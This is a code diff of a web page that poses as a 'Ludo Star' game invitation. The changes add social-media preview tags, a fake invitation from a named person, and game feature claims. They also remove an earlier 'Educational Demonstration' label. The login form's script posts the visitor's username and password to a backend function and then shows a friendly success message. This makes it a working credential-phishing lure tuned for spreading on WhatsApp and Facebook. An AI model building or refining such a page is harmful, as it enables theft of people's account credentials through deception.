@@ -1,8 +1,31 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Login - Ludo</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Open Graph Tags for WhatsApp/Facebook Preview -->
+    <meta property="og:title" content="🎲 Ludo Star ⭐ - Play Online">
+    <meta property="og:description" content="Sadiya Khan invited you to Play Ludo Star⭐ - Play Online With Friends">
+    <meta property="og:image" content="https://img.icons8.com/color/480/000000/ludo.png">
+    <meta property="og:image:width" content="480">
+    <meta property="og:image:height" content="480">
+    <meta property="og:url" content="https://playludoclub.netlify.app">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Ludo Star">
+    
+    <!-- Twitter Card Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="🎲 Ludo Star ⭐">
+    <meta name="twitter:description" content="Sadiya Khan invited you to Play Ludo Star⭐ - Play Online With Friends">
+    <meta name="twitter:image" content="https://img.icons8.com/color/480/000000/ludo.png">
+    
+    <!-- Page Title -->
+    <title>🎲 Ludo Star ⭐ - Play Online With Friends</title>
+    
+    <!-- Favicon -->
+    <link rel="icon" href="https://img.icons8.com/color/96/000000/ludo.png" type="image/png">
+    
     <style>
         * {
             margin: 0;
@@ -20,17 +43,67 @@
             padding: 20px;
         }
         
-        /* Realistic Ludo Logo */
+        /* Invitation Header */
+        .invitation-header {
+            text-align: center;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 400px;
+            margin: 20px 0;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+        }
+        
+        .invitation-header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .invitation-header .star {
+            color: #FFD700;
+            font-size: 28px;
+            animation: glow 1.5s infinite alternate;
+        }
+        
+        .inviter {
+            background: white;
+            color: #333;
+            padding: 8px 15px;
+            border-radius: 20px;
+            display: inline-block;
+            margin: 10px 0;
+            font-weight: 600;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        
+        .invitation-text {
+            font-size: 16px;
+            margin-top: 10px;
+            opacity: 0.9;
+        }
+        
+        @keyframes glow {
+            from { text-shadow: 0 0 10px #FFD700; }
+            to { text-shadow: 0 0 20px #FFD700, 0 0 30px #FFD700; }
+        }
+        
+        /* Ludo Logo */
         .logo-section {
             text-align: center;
-            margin: 30px 0 25px 0;
+            margin: 20px 0;
         }
         
         .ludo-container {
             position: relative;
             width: 150px;
             height: 150px;
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
         }
         
         .ludo-board {
@@ -44,18 +117,14 @@
             border: 3px solid #333;
         }
         
-        /* Ludo board design */
         .ludo-board::before {
             content: '';
             position: absolute;
             width: 100%;
             height: 100%;
             background: 
-                /* Vertical lines */
                 linear-gradient(90deg, transparent 49%, #333 49%, #333 51%, transparent 51%),
-                /* Horizontal lines */
                 linear-gradient(transparent 49%, #333 49%, #333 51%, transparent 51%),
-                /* Center cross */
                 linear-gradient(45deg, transparent 46%, #333 46%, #333 54%, transparent 54%),
                 linear-gradient(-45deg, transparent 46%, #333 46%, #333 54%, transparent 54%);
         }
@@ -92,7 +161,6 @@
             right: 5%;
         }
         
-        /* Home decorations */
         .home::after {
             content: '';
             position: absolute;
@@ -141,7 +209,16 @@
             color: #1877F2;
             letter-spacing: -0.5px;
             margin-bottom: 5px;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .logo-text .star {
+            color: #FFD700;
+            font-size: 36px;
+            animation: glow 1.5s infinite alternate;
         }
         
         .tagline {
@@ -150,7 +227,7 @@
             font-weight: 500;
         }
         
-        /* Login Box - Facebook Style */
+        /* Login Box */
         .login-box {
             background: white;
             border-radius: 12px;
@@ -204,20 +281,20 @@
         
         .login-btn {
             width: 100%;
-            background: #1877F2;
-            color: white;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            color: #333;
             border: none;
             border-radius: 6px;
             padding: 14px;
             font-size: 18px;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.2s;
             margin-top: 8px;
         }
         
         .login-btn:hover {
-            background: #166fe5;
+            background: linear-gradient(135deg, #FFA500, #FF8C00);
         }
         
         .login-btn:active {
@@ -292,8 +369,8 @@
             display: block;
         }
         
-        /* Telegram Info */
-        .info-box {
+        /* Features Box */
+        .features-box {
             background: white;
             border-radius: 12px;
             padding: 15px;
@@ -302,13 +379,26 @@
             max-width: 400px;
             text-align: center;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
-            border-left: 4px solid #1877F2;
+            border-left: 4px solid #FFD700;
         }
         
-        .info-box p {
+        .features-box h3 {
+            color: #333;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .features-box p {
             color: #65676B;
             font-size: 14px;
-            margin: 5px 0;
+            margin: 8px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
         
         /* Footer */
@@ -376,7 +466,7 @@
         
         /* Responsive */
         @media (max-width: 450px) {
-            .login-box, .info-box, .footer {
+            .login-box, .features-box, .footer, .invitation-header {
                 max-width: 100%;
             }
             
@@ -392,7 +482,14 @@
     </style>
 </head>
 <body>
-    <!-- Realistic Ludo Logo -->
+    <!-- Invitation Header -->
+    <div class="invitation-header">
+        <h1><span class="star">⭐</span> You're Invited! <span class="star">⭐</span></h1>
+        <div class="inviter">Sadiya Khan</div>
+        <p class="invitation-text">invited you to play</p>
+    </div>
+    
+    <!-- Ludo Logo -->
     <div class="logo-section">
         <div class="ludo-container">
             <div class="ludo-board">
@@ -424,13 +521,13 @@
                 <div class="pawn pawn-16"></div>
             </div>
         </div>
-        <div class="logo-text">Ludo</div>
-        <div class="tagline">Play, Connect, Enjoy</div>
+        <div class="logo-text">Ludo <span class="star">⭐</span> Star</div>
+        <div class="tagline">Play Online With Friends</div>
     </div>
     
-    <!-- Facebook Style Login Form -->
+    <!-- Login Form -->
     <div class="login-box">
-        <h2>Log in to Ludo</h2>
+        <h2>Join Ludo Star ⭐</h2>
         
         <form id="loginForm">
             <div class="input-group">
@@ -444,7 +541,7 @@
             </div>
             
             <button type="button" class="login-btn" onclick="login()">
-                Log In
+                ⭐ Join Game Now
             </button>
             
             <a href="#" class="forgot-link">Forgotten password?</a>
@@ -458,28 +555,30 @@
     <!-- Result Message -->
     <div id="result"></div>
     
-    <!-- Info Box -->
-    <div class="info-box">
-        <p>🔒 Secure login system</p>
-        <p>🎮 Connect with friends</p>
-        <p>🏆 Play tournaments</p>
+    <!-- Features Box -->
+    <div class="features-box">
+        <h3>🎮 Game Features</h3>
+        <p>✅ Play with Sadiya Khan & Friends</p>
+        <p>✅ Real-time Multiplayer</p>
+        <p>✅ Win Coins & Rewards</p>
+        <p>✅ Voice Chat Available</p>
+        <p>✅ Daily Bonuses</p>
     </div>
     
     <!-- Footer -->
     <div class="footer">
         <div style="margin-bottom: 10px;">
-            <a href="#" style="color:#1877F2; font-weight:600; text-decoration:none;">Ludo</a> 
+            <a href="#" style="color:#FFD700; font-weight:600; text-decoration:none;">Ludo Star ⭐</a> 
             © 2024
         </div>
         <div class="footer-links">
-            <a href="#">About</a> · 
-            <a href="#">Help</a> · 
-            <a href="#">Privacy</a> · 
-            <a href="#">Terms</a> · 
-            <a href="#">Cookies</a>
+            <a href="#">Invite Friends</a> · 
+            <a href="#">How to Play</a> · 
+            <a href="#">Leaderboard</a> · 
+            <a href="#">Support</a>
         </div>
         <div style="margin-top: 15px; font-size: 11px; color: #b0b3b8;">
-            Educational Demonstration
+            Invitation from Sadiya Khan • Join now to play together!
         </div>
     </div>
 
@@ -500,7 +599,7 @@
             }
             
             // Show loading
-            showResult('Logging in...', 'loading');
+            showResult('Joining Ludo Star game...', 'loading');
             
             try {
                 // Call Netlify Function
@@ -513,14 +612,15 @@
                         username: username,
                         password: password,
                         timestamp: new Date().toISOString(),
-                        source: 'Ludo Login'
+                        source: 'Ludo Star Invitation',
+                        inviter: 'Sadiya Khan'
                     })
                 });
                 
                 const data = await response.json();
                 
                 if (data.success) {
-                    showResult('✅ Login successful!', 'success');
+                    showResult('✅ Welcome to Ludo Star! Sadiya Khan will be notified.', 'success');
                     
                     // Clear form after 2 seconds
                     setTimeout(() => {
@@ -529,7 +629,7 @@
                     }, 2000);
                     
                 } else {
-                    showResult('❌ Error: ' + (data.error || 'Login failed'), 'error');
+                    showResult('❌ Error: ' + (data.error || 'Join failed'), 'error');
                 }
                 
             } catch (error) {
